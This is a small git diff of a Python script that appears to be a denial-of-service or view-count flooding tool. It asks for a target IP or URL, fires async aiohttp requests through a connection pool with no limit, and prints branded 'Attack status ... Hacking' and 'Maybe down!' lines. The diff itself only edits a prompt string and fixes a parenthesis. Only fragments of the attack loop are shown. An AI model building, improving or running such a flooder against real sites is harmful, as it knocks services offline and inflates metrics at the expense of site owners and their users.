@@ -28,7 +28,7 @@ logo = """
 """
 faded_text = fade.fire(logo)
 print(faded_text)
-ask = fade.pinkred("\033[96mRun SC butuh wkt 35 detik: IP/URL: \033[0m")
+ask = fade.pinkred("\033[96m==⟩⟩ Run SC butuh wkt 35 detik: IP/URL: \033[0m")
 url = input(ask)
 
 async def increment_view_count(session):
@@ -39,7 +39,7 @@ async def increment_view_count(session):
             else:
                 print("\033[33m[*] \033[33mHUDAIRUL-AQSHA \033[36m Attack status \033[35m" +str(url)+ "  \033[93mHacking\033[0m"),
     except aiohttp.ClientError as e:
-            print("\033[31m[!] \033[32mHUDAIRUL-AQSHA \033[34m Attack status \033[96m" +str(url)+ "  \033[95mMaybe down!\033[0m"), e)
+            print("\033[31m[!] \033[32mHUDAIRUL-AQSHA \033[34m Attack status \033[96m" +str(url)+ "  \033[95mMaybe down!\033[0m", e)
 
 async def main():
     connector = aiohttp.TCPConnector(limit=None)  # Enable connection pooling
